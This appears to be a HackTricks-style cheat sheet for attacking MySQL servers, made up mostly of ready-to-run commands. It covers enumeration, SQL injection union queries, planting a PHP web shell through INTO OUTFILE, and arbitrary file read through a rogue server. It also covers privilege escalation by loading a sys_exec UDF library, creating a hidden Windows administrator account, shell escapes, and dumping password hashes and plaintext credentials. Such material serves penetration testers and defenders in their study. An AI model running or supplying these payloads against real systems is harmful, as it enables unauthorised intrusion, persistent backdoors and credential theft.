# 3306 - Pentesting Mysql

## **Basic Information**

**MySQL** is a freely available open source Relational Database Management System \(RDBMS\) that uses Structured Query Language \(**SQL**\).  
\_\*\*\_From [here](https://www.siteground.com/tutorials/php-mysql/mysql/).

**Default port:** 3306

```text
3306/tcp open  mysql
```

## **Connect**

### **Local**

```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```

### Remote

```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```

## Enumeration

Some of the enumeration actions require valid credentials

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```

[**Brute force**](../brute-force.md#mysql)

## Write any binary data

```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```

## **Basic & interesting MySQL commands**

```bash
show databases;
use <database>;
show tables;
describe <table_name>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Try to execute code
select do_system('id');
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```

## MySQL arbitrary read file by client

Actually, when you try to **load data local into a table** the **content of a file** the MySQL or MariaDB server asks the **client to read it** and send the content. **Then, if you can tamper a mysql client to connect to your own MyQSL server, you can read arbitrary files.**  
Please notice that this is the behaviour using:

```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```

\(Notice the "local" word\)  
Because without the "local" you can get:

```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

**Initial PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)  
**In this paper you can see a complete description of the attack and even how to extend it to RCE:** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)  
**Here you can find an overview of the attack:** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

## POST

### Mysql User

It will be very interesting if mysql is running as **root**:

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
```

### Privilege escalation

How to:

* Current Level of access
  * mysql&gt;`select user();`
  * mysql&gt;`select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';`
* Access passwords
  * mysql&gt; `use mysql`
  * mysql&gt; `select user,password from user;`
* Create a new user and grant him privileges
  * mysql&gt;`create user test identified by 'test';`
  * mysql&gt; `grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;`
* Break into a shell
  * mysql&gt; `\! cat /etc/passwd`
  * mysql&gt; `\! bash`

### Privilege Escalation via library

You can find **compiled versions** of this **libraries** in sqlmap: `locate lib_mysqludf_sys.so` and `locate lib_mysqludf_sys.dll`Instead of `locate` you can also use `whereis` to search for this libraries inside the host.

#### Linux

```sql
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('id > /tmp/out.txt');
```

#### Windows

```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_files('C://temp//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

### Extracting MySQL credentials from the database

```sql
SELECT User,Host,Password FROM mysql.user;
SELECT User,Host,authentication_string FROM mysql.user;
```

```bash
mysql -u root --password=<PASSWORD> -e "SELECT User,Host,authentication_string FROM mysql.user;"
```

### Extracting MySQL credentials from files

Inside _/etc/mysql/debian.cnf_ you can find the **plain-text password** of the user **debian-sys-maint**

```bash
cat /etc/mysql/debian.cnf
```

You can **use these credentials to login in the mysql database**.

Inside the file: _/var/lib/mysql/mysql/user.MYD_ you can find **all the hashes of the MySQL users** \(the ones that you can extract from mysql.user inside the database\)_._

You can extract them doing:

```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### Enabling logging

You can enable logging of mysql queries inside `/etc/mysql/my.cnf` uncommenting the following lines:

![](../.gitbook/assets/image%20%28308%29.png)

### Useful files

Configuration Files

* windows
  * * config.ini
    * my.ini
      * windows\my.ini
      * winnt\my.ini
    * &lt;InstDir&gt;/mysql/data/
  * unix
    * my.cnf
      * /etc/my.cnf
      * /etc/mysql/my.cnf
      * /var/lib/mysql/my.cnf
      * ~/.my.cnf
      * /etc/my.cnf
* Command History
  * ~/.mysql.history
* Log Files
  * connections.log
  * update.log
  * common.log

## Default MySQL Database/Tables

{% tabs %}
{% tab title="information\_schema" %}
ALL\_PLUGINS  
APPLICABLE\_ROLES  
CHARACTER\_SETS  
CHECK\_CONSTRAINTS  
COLLATIONS  
COLLATION\_CHARACTER\_SET\_APPLICABILITY  
COLUMNS  
COLUMN\_PRIVILEGES  
ENABLED\_ROLES  
ENGINES  
EVENTS  
FILES  
GLOBAL\_STATUS  
GLOBAL\_VARIABLES  
KEY\_COLUMN\_USAGE  
KEY\_CACHES  
OPTIMIZER\_TRACE  
PARAMETERS  
PARTITIONS  
PLUGINS  
PROCESSLIST  
PROFILING  
REFERENTIAL\_CONSTRAINTS  
ROUTINES  
SCHEMATA  
SCHEMA\_PRIVILEGES  
SESSION\_STATUS  
SESSION\_VARIABLES  
STATISTICS  
SYSTEM\_VARIABLES  
TABLES  
TABLESPACES  
TABLE\_CONSTRAINTS  
TABLE\_PRIVILEGES  
TRIGGERS  
USER\_PRIVILEGES  
VIEWS  
INNODB\_LOCKS  
INNODB\_TRX  
INNODB\_SYS\_DATAFILES  
INNODB\_FT\_CONFIG  
INNODB\_SYS\_VIRTUAL  
INNODB\_CMP  
INNODB\_FT\_BEING\_DELETED  
INNODB\_CMP\_RESET  
INNODB\_CMP\_PER\_INDEX  
INNODB\_CMPMEM\_RESET  
INNODB\_FT\_DELETED  
INNODB\_BUFFER\_PAGE\_LRU  
INNODB\_LOCK\_WAITS  
INNODB\_TEMP\_TABLE\_INFO  
INNODB\_SYS\_INDEXES  
INNODB\_SYS\_TABLES  
INNODB\_SYS\_FIELDS  
INNODB\_CMP\_PER\_INDEX\_RESET  
INNODB\_BUFFER\_PAGE  
INNODB\_FT\_DEFAULT\_STOPWORD  
INNODB\_FT\_INDEX\_TABLE  
INNODB\_FT\_INDEX\_CACHE  
INNODB\_SYS\_TABLESPACES  
INNODB\_METRICS  
INNODB\_SYS\_FOREIGN\_COLS  
INNODB\_CMPMEM  
INNODB\_BUFFER\_POOL\_STATS  
INNODB\_SYS\_COLUMNS  
INNODB\_SYS\_FOREIGN  
INNODB\_SYS\_TABLESTATS  
GEOMETRY\_COLUMNS  
SPATIAL\_REF\_SYS  
CLIENT\_STATISTICS  
INDEX\_STATISTICS  
USER\_STATISTICS  
INNODB\_MUTEXES  
TABLE\_STATISTICS  
INNODB\_TABLESPACES\_ENCRYPTION  
user\_variables  
INNODB\_TABLESPACES\_SCRUBBING  
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="mysql" %}
columns\_priv  
column\_stats  
db  
engine\_cost  
event  
func  
general\_log  
gtid\_executed  
gtid\_slave\_pos  
help\_category  
help\_keyword  
help\_relation  
help\_topic  
host  
index\_stats  
innodb\_index\_stats  
innodb\_table\_stats  
ndb\_binlog\_index  
plugin  
proc  
procs\_priv  
proxies\_priv  
roles\_mapping  
server\_cost  
servers  
slave\_master\_info  
slave\_relay\_log\_info  
slave\_worker\_info  
slow\_log  
tables\_priv  
table\_stats  
time\_zone  
time\_zone\_leap\_second  
time\_zone\_name  
time\_zone\_transition  
time\_zone\_transition\_type  
transaction\_registry  
user
{% endtab %}

{% tab title="performance\_schema" %}
accounts  
cond\_instances  
events\_stages\_current  
events\_stages\_history  
events\_stages\_history\_long  
events\_stages\_summary\_by\_account\_by\_event\_name  
events\_stages\_summary\_by\_host\_by\_event\_name  
events\_stages\_summary\_by\_thread\_by\_event\_name  
events\_stages\_summary\_by\_user\_by\_event\_name  
events\_stages\_summary\_global\_by\_event\_name  
events\_statements\_current  
events\_statements\_history  
events\_statements\_history\_long  
events\_statements\_summary\_by\_account\_by\_event\_name  
events\_statements\_summary\_by\_digest  
events\_statements\_summary\_by\_host\_by\_event\_name  
events\_statements\_summary\_by\_program  
events\_statements\_summary\_by\_thread\_by\_event\_name  
events\_statements\_summary\_by\_user\_by\_event\_name  
events\_statements\_summary\_global\_by\_event\_name  
events\_transactions\_current  
events\_transactions\_history  
events\_transactions\_history\_long  
events\_transactions\_summary\_by\_account\_by\_event\_name  
events\_transactions\_summary\_by\_host\_by\_event\_name  
events\_transactions\_summary\_by\_thread\_by\_event\_name  
events\_transactions\_summary\_by\_user\_by\_event\_name  
events\_transactions\_summary\_global\_by\_event\_name  
events\_waits\_current  
events\_waits\_history  
events\_waits\_history\_long  
events\_waits\_summary\_by\_account\_by\_event\_name  
events\_waits\_summary\_by\_host\_by\_event\_name  
events\_waits\_summary\_by\_instance  
events\_waits\_summary\_by\_thread\_by\_event\_name  
events\_waits\_summary\_by\_user\_by\_event\_name  
events\_waits\_summary\_global\_by\_event\_name  
file\_instances  
file\_summary\_by\_event\_name  
file\_summary\_by\_instance  
global\_status  
global\_variables  
host\_cache  
hosts  
memory\_summary\_by\_account\_by\_event\_name  
memory\_summary\_by\_host\_by\_event\_name  
memory\_summary\_by\_thread\_by\_event\_name  
memory\_summary\_by\_user\_by\_event\_name  
memory\_summary\_global\_by\_event\_name  
metadata\_locks  
mutex\_instances  
objects\_summary\_global\_by\_type  
performance\_timers  
prepared\_statements\_instances  
replication\_applier\_configuration  
replication\_applier\_status  
replication\_applier\_status\_by\_coordinator  
replication\_applier\_status\_by\_worker  
replication\_connection\_configuration  
replication\_connection\_status  
replication\_group\_member\_stats  
replication\_group\_members  
rwlock\_instances  
session\_account\_connect\_attrs  
session\_connect\_attrs  
session\_status  
session\_variables  
setup\_actors  
setup\_consumers  
setup\_instruments  
setup\_objects  
setup\_timers  
socket\_instances  
socket\_summary\_by\_event\_name  
socket\_summary\_by\_instance  
status\_by\_account  
status\_by\_host  
status\_by\_thread  
status\_by\_user  
table\_handles  
table\_io\_waits\_summary\_by\_index\_usage  
table\_io\_waits\_summary\_by\_table  
table\_lock\_waits\_summary\_by\_table  
threads  
user\_variables\_by\_thread  
users  
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary  
host\_summary\_by\_file\_io  
host\_summary\_by\_file\_io\_type  
host\_summary\_by\_stages  
host\_summary\_by\_statement\_latency  
host\_summary\_by\_statement\_type  
innodb\_buffer\_stats\_by\_schema  
innodb\_buffer\_stats\_by\_table  
innodb\_lock\_waits  
io\_by\_thread\_by\_latency  
io\_global\_by\_file\_by\_bytes  
io\_global\_by\_file\_by\_latency  
io\_global\_by\_wait\_by\_bytes  
io\_global\_by\_wait\_by\_latency  
latest\_file\_io  
memory\_by\_host\_by\_current\_bytes  
memory\_by\_thread\_by\_current\_bytes  
memory\_by\_user\_by\_current\_bytes  
memory\_global\_by\_current\_bytes  
memory\_global\_total  
metrics  
processlist  
ps\_check\_lost\_instrumentation  
schema\_auto\_increment\_columns  
schema\_index\_statistics  
schema\_object\_overview  
schema\_redundant\_indexes  
schema\_table\_lock\_waits  
schema\_table\_statistics  
schema\_table\_statistics\_with\_buffer  
schema\_tables\_with\_full\_table\_scans  
schema\_unused\_indexes  
session  
session\_ssl\_status  
statement\_analysis  
statements\_with\_errors\_or\_warnings  
statements\_with\_full\_table\_scans  
statements\_with\_runtimes\_in\_95th\_percentile  
statements\_with\_sorting  
statements\_with\_temp\_tables  
sys\_config  
user\_summary  
user\_summary\_by\_file\_io  
user\_summary\_by\_file\_io\_type  
user\_summary\_by\_stages  
user\_summary\_by\_statement\_latency  
user\_summary\_by\_statement\_type  
version  
wait\_classes\_global\_by\_avg\_latency  
wait\_classes\_global\_by\_latency  
waits\_by\_host\_by\_latency  
waits\_by\_user\_by\_latency  
waits\_global\_by\_latency  
x$host\_summary  
x$host\_summary\_by\_file\_io  
x$host\_summary\_by\_file\_io\_type  
x$host\_summary\_by\_stages  
x$host\_summary\_by\_statement\_latency  
x$host\_summary\_by\_statement\_type  
x$innodb\_buffer\_stats\_by\_schema  
x$innodb\_buffer\_stats\_by\_table  
x$innodb\_lock\_waits  
x$io\_by\_thread\_by\_latency  
x$io\_global\_by\_file\_by\_bytes  
x$io\_global\_by\_file\_by\_latency  
x$io\_global\_by\_wait\_by\_bytes  
x$io\_global\_by\_wait\_by\_latency  
x$latest\_file\_io  
x$memory\_by\_host\_by\_current\_bytes  
x$memory\_by\_thread\_by\_current\_bytes  
x$memory\_by\_user\_by\_current\_bytes  
x$memory\_global\_by\_current\_bytes  
x$memory\_global\_total  
x$processlist  
x$ps\_digest\_95th\_percentile\_by\_avg\_us  
x$ps\_digest\_avg\_latency\_distribution  
x$ps\_schema\_table\_statistics\_io  
x$schema\_flattened\_keys  
x$schema\_index\_statistics  
x$schema\_table\_lock\_waits  
x$schema\_table\_statistics  
x$schema\_table\_statistics\_with\_buffer  
x$schema\_tables\_with\_full\_table\_scans  
x$session  
x$statement\_analysis  
x$statements\_with\_errors\_or\_warnings  
x$statements\_with\_full\_table\_scans  
x$statements\_with\_runtimes\_in\_95th\_percentile  
x$statements\_with\_sorting  
x$statements\_with\_temp\_tables  
x$user\_summary  
x$user\_summary\_by\_file\_io  
x$user\_summary\_by\_file\_io\_type  
x$user\_summary\_by\_stages  
x$user\_summary\_by\_statement\_latency  
x$user\_summary\_by\_statement\_type  
x$wait\_classes\_global\_by\_avg\_latency  
x$wait\_classes\_global\_by\_latency  
x$waits\_by\_host\_by\_latency  
x$waits\_by\_user\_by\_latency  
x$waits\_global\_by\_latency
{% endtab %}
{% endtabs %}

## HackTricks Automatic Commands

```text
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Name: Notes
Description: Notes for MySql
Note: """
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql
"""

Name: Nmap
Description: Nmap with MySql Scripts
Command: """nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306"""

Name: MySql
Description: Attempt to connect to mysql server
Command: """mysql -h {IP} -u {Username}@localhost"""
```

